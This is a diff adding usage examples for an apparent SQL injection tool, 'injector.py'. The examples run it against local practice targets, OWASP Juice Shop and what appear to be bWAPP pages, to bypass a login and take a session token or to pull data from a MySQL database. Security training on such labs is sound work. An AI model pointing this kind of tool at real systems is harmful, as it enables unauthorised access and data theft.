@@ -1,0 +1,40 @@
+python3 injector.py \
+  --header "Host" "localhost:3000" \
+  --header "User-Agent" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0" \
+  --header "Accept" "application/json, text/plain, */*" \
+  --header "Accept-Language" "en-US,en;q=0.5" \
+  --header "Accept-Encoding" "gzip, deflate, br, zstd" \
+  --header "Content-Type" "application/json" \
+  --header "Origin" "http://localhost:3000" \
+  --header "Connection" "keep-alive" \
+  --header "Referer" "http://localhost:3000/login" \
+  --header "Pragma" "no-cache" \
+  --header "Cache-Control" "no-cache" \
+  -X POST \
+  --body '{"email":"admin@juice-sh.op","password":"notit"}' \
+  "http://localhost:3000/rest/user/login"
+
+POST SQLite : Bypass the login protocol and obtains a session token.
+
+
+################################################################################################################################
+
+
+python3 injector.py --header Cookie "security_level=0; PHPSESSID=272cd80e23bb6492b2100f8870c4993a" \
+  --header Cache-Control "no-cache" "http://localhost:8080/sqli_1.php?title=&action=search"
+
+GET MYSQL : Extracts datas from a MYSQL database.
+
+
+################################################################################################################################
+
+
+python3 injector.py -X POST --header Cookie "security_level=0; language=en; PHPSESSID=272cd80e23bb6492b2100f8870c4993a" \
+	--header Content-Type "application/x-www-form-urlencoded" --header Cache-Control "no-cache" \
+	--body "title=&action=search" "http://localhost:8080/sqli_6.php"
+
+POST MYSQL : Extracts datas from a MYSQL database.
+
+
+################################################################################################################################
+
